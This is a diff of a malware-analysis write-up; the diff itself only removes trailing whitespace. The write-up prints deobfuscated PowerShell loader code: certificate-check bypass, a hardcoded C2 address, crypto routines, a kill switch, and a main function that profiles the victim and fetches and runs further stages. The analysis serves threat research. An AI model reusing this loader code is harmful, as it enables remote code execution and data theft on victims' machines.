@@ -28,7 +28,7 @@ powershell /w 1 IEX(New-Object IO.StreamReader((New-Object System.IO.Compression
 
 <h6>On the second layer, we can see multiple blocs of functions and variables. The first bloc content the parameters like IP, the validation for check the validity of the certificate and URL.</h6>
 
-``` powershell 
+``` powershell
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 $IP="https://213.227.155.25:443"
 $URL="https://213.227.155.25:443/babel-polyfill/6.3.14/"
@@ -36,7 +36,7 @@ $URL="https://213.227.155.25:443/babel-polyfill/6.3.14/"
 
 <h6>The next bloc content the functions for decode and encode in RC4. This is used for obfuscating the strings and the communications between the client and the server C2.</h6>
 
-``` powershell 
+``` powershell
 function CAM ($key,$IV)
 {
     try {$a = New-Object "System.Security.Cryptography.RijndaelManaged"} catch {$a = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"}
@@ -78,8 +78,8 @@ function DEC ($key,$enc)
 
 <h6>The next function is used for check the local time and trigged a kill switch if this after 12th December 2019. Once this check this setup the proxy settings if the version of the CLR is at least over the second version.</h6>
 
-``` powershell 
-function Get-Webclient ($Cookie) 
+``` powershell
+function Get-Webclient ($Cookie)
 {
     #Kill switch
     $date = (Get-Date -Format "dd/MM/yyyy");
@@ -101,37 +101,37 @@ function Get-Webclient ($Cookie)
     }
     $webclient.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36")
     $webclient.Headers.Add("Referer","")
-    if ($proxyurl) 
+    if ($proxyurl)
     {
         $webproxy = New-Object System.Net.WebProxy($proxyurl,$true);
-        if ($username -and $password) 
+        if ($username -and $password)
         {
             $PSS = ConvertTo-SecureString $password -AsPlainText -Force
             $getcreds = new-object system.management.automation.PSCredential $username,$PSS
             $webproxy.Credentials = $getcreds
-        } 
+        }
         else { $webclient.UseDefaultCredentials = $true }
-        $webclient.Proxy = $webproxy; 
-    } 
-    else 
+        $webclient.Proxy = $webproxy;
+    }
+    else
     {
         $webclient.UseDefaultCredentials = $true;
         $webclient.Proxy.Credentials = $webclient.Credentials;
-    } 
+    }
     if ($cookie) { $webclient.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie") }
-    $webclient 
+    $webclient
 }
 ```
 <h6>The main function is called three times for download the next stage of the payload, decode with the secret of the RC4 algorithm and execute it. By the same time send informations of the victim to C2 as new session created.</h6>
 
 ```powershell
-function main 
+function main
 {
     $cu = [System.Security.Principal.WindowsIdentity]::GetCurrent()
     $webproxy = New-Object System.Security.Principal.WindowsPrincipal($cu)
     $ag = [System.Security.Principal.WindowsBuiltInRole]::Administrator
     if ($webproxy.IsInRole($ag)){$el="*"}else{$el=""}
-    try{$u=($cu).name+$el} 
+    try{$u=($cu).name+$el}
     catch
     {
         if ($env:username -eq "$($env:computername)$"){}
@@ -212,7 +212,7 @@ try {main} catch {}
 <h2>Links <a name="Links"></a></h2>
 <h6> Original tweet: </h6><a name="tweet"></a>
 
-* [https://twitter.com/CTI_Marc/status/1194573048625729536](https://twitter.com/CTI_Marc/status/1194573048625729536) 
+* [https://twitter.com/CTI_Marc/status/1194573048625729536](https://twitter.com/CTI_Marc/status/1194573048625729536)
 
 <h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>
 
